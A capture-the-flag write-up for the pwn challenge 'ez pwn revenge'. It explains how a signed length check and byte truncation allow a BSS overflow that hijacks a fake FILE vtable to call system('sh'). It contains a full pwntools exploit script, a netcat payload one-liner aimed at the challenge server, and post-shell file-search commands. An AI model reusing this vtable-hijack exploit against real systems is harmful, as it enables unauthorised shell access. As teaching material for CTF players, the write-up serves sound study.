# ez pwn revenge

> **Category:** Pwn\
> **Flag:** `LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}`

***

### Table of Contents

1. Binary Overview
2. Vulnerability Analysis
3. Exploit Strategy
4. Exploit Flow (Step by Step)
5. Script
6. Full Reproduction
7. Lessons Learned

***

### Binary Overview

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
       dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
       BuildID[sha1]=4a3b016..., not stripped

$ checksec --file=chall
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

| Protection   | Status  | Impact on Exploit                               |
| ------------ | ------- | ----------------------------------------------- |
| **RELRO**    | Full    | GOT is read-only; cannot overwrite GOT entries  |
| **Canary**   | None    | No stack cookie to leak/brute-force             |
| **NX**       | Enabled | Cannot execute shellcode on stack/heap          |
| **PIE**      | None    | All code/data at fixed addresses (`0x400000`)   |
| **Stripped** | No      | Symbols preserved — easy to understand the code |

**Notable symbols:**

| Symbol                   | Address    | Purpose                                                        |
| ------------------------ | ---------- | -------------------------------------------------------------- |
| `main`                   | `0x40130f` | Entry point                                                    |
| `init_proc`              | `0x4011b1` | Calls `setvbuf` on stdin/stdout                                |
| `init_fake_file`         | `0x4011f3` | Initialises a fake FILE struct in BSS                          |
| `custom_fclose`          | `0x40128d` | Custom "fclose" that dispatches through a vtable               |
| `normal_overflow`        | `0x401197` | vtable entry #0 — does nothing useful                          |
| `normal_finish`          | `0x4011a6` | vtable entry #1 — does nothing useful                          |
| `please_do_not_use_this` | `0x401186` | Calls `system("echo system is here, but not for you")` — decoy |
| `normal_vtable`          | `0x404010` | Contains `{normal_overflow, normal_finish}`                    |
| `box`                    | `0x404040` | BSS buffer, 0x60+ bytes                                        |

***

### Vulnerability Analysis

#### The Bug

```c
int size;
scanf("%d", &size);          // reads signed int
if (size <= 0x50) {           // signed comparison (jle)
    read(0, box, (unsigned char)size);  // low byte used as length!
}
```

Two critical observations:

1. **Signed comparison bypass**: The `jle` (jump if less or equal, signed) instruction checks `size <= 0x50`. A **negative** number like `-1` passes this check because `-1 < 0x50` in signed arithmetic.
2. **Truncation to byte**: `size` (a 32-bit `int`) is truncated to its lowest byte via `mov [rbp-0x5], al`. For `-1` (i.e. `0xFFFFFFFF`), `al = 0xFF = 255`. This is then zero-extended and passed to `read(0, box, 255)`.

**Result:** We can write **up to 255 bytes** into `box` (0x404040), even though the author intended a maximum of 80 bytes.

#### What lives past byte 80?

The BSS layout around `box`:

| Address    | Name       | Size   | Purpose                                    |
| ---------- | ---------- | ------ | ------------------------------------------ |
| `0x404040` | `box`      | ?      | Our input buffer                           |
| `0x404090` | `box+0x50` | 4      | Decoy-flag guard (int)                     |
| `0x404098` | `box+0x58` | 8      | Decoy-flag guard (long)                    |
| `0x4040a0` | `box+0x60` | \~0x60 | Fake FILE struct (`init_fake_file` target) |
| `0x4040e8` | `box+0xa8` | 8      | **Fake FILE vtable pointer**               |

The `init_fake_file` function writes a fake `FILE` structure at `box+0x60` (0x4040a0) with:

* `file+0x10` (0x4040b0) = `0xfbad0000` (flags)
* `file+0x28` (0x4040c8) = `0x404090` (write\_base)
* `file+0x30` (0x4040d0) = `0x404040` (write\_ptr)
* `file+0x48` (0x4040e8) = `0x404010` (vtable → `normal_vtable`)

#### Decoy Flag Check

```c
if (*(int*)(box+0x50) != 0 && *(long*)(box+0x58) != 0xdeadbeefcafebabe) {
    printf("Here a fake flag for your effort: %s", &stack_string);
}
```

The "flag" printed is a hard-coded decoy: `LYKNCTF{this_is_a_super_fake_flag_for_you}`. Ignore it.

#### The Real Target — `custom_fclose`

```c
void custom_fclose(FILE* fp) {
    if (fp == NULL) return;
    void** vtable = *(void***)(fp + 0x48);   // load vtable pointer
    if (vtable == NULL) return;

    int flags = *(int*)(fp + 0x10);
    if ((flags & 0xffff0000) == 0xfbad0000) {
        // "overflow" path — calls vtable[0](fp)
        if (*(fp + 0x20) > *(fp + 0x28))
            ((void(*)(FILE*))vtable[0])(fp);
    } else {
        // "finish" path — calls vtable[1](fp)
        ((void(*)(FILE*))vtable[1])(fp);
    }
}
```

This custom function reads a **vtable pointer from our controlled data** (at FILE+0x48 = box+0xa8) and calls a function through it. Since we control bytes up to offset 0xaf, we control both the vtable pointer and the vtable entries.

***

### Exploit Strategy

#### Goal

Get a shell (`system("/bin/sh")`) or execute arbitrary commands.

#### Constraints

* **Full RELRO** → cannot overwrite GOT.
* **NX** → cannot inject shellcode.
* **No PIE** → `system@plt` at fixed address `0x401040`.

#### Attack Plan

1. Send `-1` as the buffer length → bypasses the `<= 80` guard → `read()` reads 255 bytes.
2. Overwrite the fake FILE struct fields:
   * Set `file+0x10` (flags) to `0` instead of `0xfbad0000` → forces the **else branch** in `custom_fclose`.
   * Set `file+0x48` (vtable pointer) to `0x4040b0` (points to our input at offset `0x70`).
   * At `0x4040b0+8` = `0x4040b8` (offset `0x78` in input), place `system@plt` (`0x401040`) → this becomes **vtable\[1]**.
3. The `else` branch calls `vtable[1](file_ptr)` = `system(0x4040a0)`.
4. At `0x4040a0` (offset `0x60` in input), place the string `"sh"` → `system("sh")`.

#### Why This Works

| Step                         | What happens                                                |
| ---------------------------- | ----------------------------------------------------------- |
| `-1` input                   | `scanf` reads `-1`, `jle 80` passes, `al = 0xFF = 255`      |
| `read(0, box, 255)`          | We write 176 bytes, overwriting everything up to `box+0xaf` |
| `file+0x10 = 0`              | `(0 & 0xffff0000) != 0xfbad0000` → else branch taken        |
| `file+0x48 = 0x4040b0`       | vtable\_ptr = our controlled address                        |
| `*(0x4040b0+8) = system@plt` | vtable\[1] points to system                                 |
| `rdi = file_ptr = 0x4040a0`  | First arg = address where we have `"sh\0"`                  |
| `system("sh")`               | Shell obtained                                              |

***

### Exploit Flow (Step by Step)

#### Step 1 — Connect and send negative length

```
$ nc 15.235.202.47 8996
Let me know the length of your buffer:
> -1
okay, so your length is -1
>
```

#### Step 2 — Send crafted payload

The payload is 176 bytes structured as:

```
Offset  Bytes     Value         Purpose
──────  ────     ─────         ───────
0x00    80       \x00 * 80     Padding
0x50     4       0x00000000    box+0x50 = 0 (skip decoy flag)
0x54     4       \x00 * 4      Padding
0x58     8       0xdeadbeef..  box+0x58 guard (don't print decoy)
0x60     8       "sh\0" + pad  FILE+0x00 = command (rdi→here)
0x68     8       0x00000000    FILE+0x08
0x70     8       0x00000000    FILE+0x10 = flags = 0 (else path)
0x78     8       0x0000000000401040   FILE+0x18 = system@plt = vtable[1]
0x80     8       0x00000000    FILE+0x20
0x88     8       0x00000000    FILE+0x28
0x90     8       0x00000000    FILE+0x30
0x98     8       0x00000000    FILE+0x38
0xa0     8       0x00000000    FILE+0x40
0xa8     8       0x00000000004040b0   FILE+0x48 = vtable_ptr → box+0x70
```

**vtable resolution:**

```
vtable = *(0x4040a0 + 0x48) = *(0x4040e8) = 0x4040b0
vtable[1] = *(0x4040b0 + 8) = *(0x4040b8) = 0x401040 (system@plt)
```

#### Step 3 — Receive shell, read flag

```
$ cat /home/ez_pwn/flag.txt
LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
```

#### Step 4 — Alternate commands (if flag not at expected path)

```bash
ls -la /home/
cat /home/ez_pwn/flag.txt
find / -name "flag*" -type f 2>/dev/null
```

***

### Script

#### `exploit.py`

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

SYSTEM_PLT = 0x401040

def exploit(host='15.235.202.47', port=8996):
    r = remote(host, port)

    r.recvuntil(b'buffer: ')
    r.sendline(b'-1')                # signed cmp bypass
    r.recvuntil(b'> \n')

    payload  = b'\x00' * 0x50
    payload += p32(0)
    payload += b'\x00' * 4
    payload += p64(0xdeadbeefcafebabe)
    payload += b'sh\x00' + b'\x00' * 5
    payload += p64(0)                    # FILE+0x08
    payload += p64(0)                    # FILE+0x10 = flags (0)
    payload += p64(SYSTEM_PLT)           # FILE+0x18 = system@plt
    payload += p64(0) * 5                # FILE+0x20..0x40
    payload += p64(0x4040b0)            # FILE+0x48 = vtable_ptr

    r.send(payload)
    sleep(0.5)

    r.sendline(b'cat /home/ez_pwn/flag.txt')
    r.interactive()

if __name__ == '__main__':
    exploit()
```

***

### Full Reproduction

#### Requirements

* Python 3
* `pwntools` (`pip install pwn`)

#### Run

```bash
python3 exploit.py
```

Expected output:

```
[+] Opening connection to 15.235.202.47 on port 8996: Done
[*] Switching to interactive mode
Let's me check if you are safe or not!
You doing it right. Are you?
Your overflow attempt is 999999
LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
```

#### Manual reproduction with netcat + hex

You can also reproduce the exploit manually using a hex generator and `nc`:

```bash
# Generate payload and pipe to nc with a one-shot command
python3 -c "
from pwn import *
payload  = b'\x00' * 0x50
payload += p32(0)
payload += b'\x00' * 4
payload += p64(0xdeadbeefcafebabe)
payload += b'sh\x00' + b'\x00' * 5
payload += p64(0) * 2
payload += p64(0x401040)
payload += p64(0) * 5
payload += p64(0x4040b0)
import sys
sys.stdout.buffer.write(payload)
" > payload.bin

(echo '-1'; sleep 0.3; cat payload.bin; sleep 0.3; echo 'cat /home/ez_pwn/flag.txt'; sleep 1) | nc 15.235.202.47 8996
```

#### Tools used

| Tool                | Purpose                                    |
| ------------------- | ------------------------------------------ |
| `file` / `checksec` | Binary identification, protection analysis |
| `objdump`           | Disassembly and .rodata/.data extraction   |
| `strings`           | Extract hard-coded strings and addresses   |
| `nm` / `readelf`    | Symbol table, relocation entries           |
| `pwntools`          | Exploit development framework              |
| `netcat`            | Raw connection testing                     |

***

### Lessons Learned

1. **Signed vs unsigned comparisons are a common CTF trick.** Always check whether `jle`/`jg` (signed) vs `jbe`/`ja` (unsigned) is used. Feeding a negative number can bypass upper-bound checks.
2. **Truncation to byte.** When an `int` is narrowed to `char`/`uint8_t`, `-1` becomes `255`. This can turn a small read into a large one.
3. **Never trust "please do not use this" functions.** The `please_do_not_use_this` function was a red herring — it runs `system("echo system is here, but not for you")` which just echoes a taunt. The real goal was to redirect to `system@plt` with our own string argument.
4. **Custom vtable dispatch in BSS is writable.** Even with Full RELRO (which protects GOT), BSS and data sections are still writable. The fake FILE's vtable pointer lived in BSS and was reachable via the overflow.
5. **`rdi` = first arg on x86-64.** The `custom_fclose` function calls vtable entries with the FILE pointer as the first argument (`rdi`). By controlling what's at that address, we control what `system` executes.
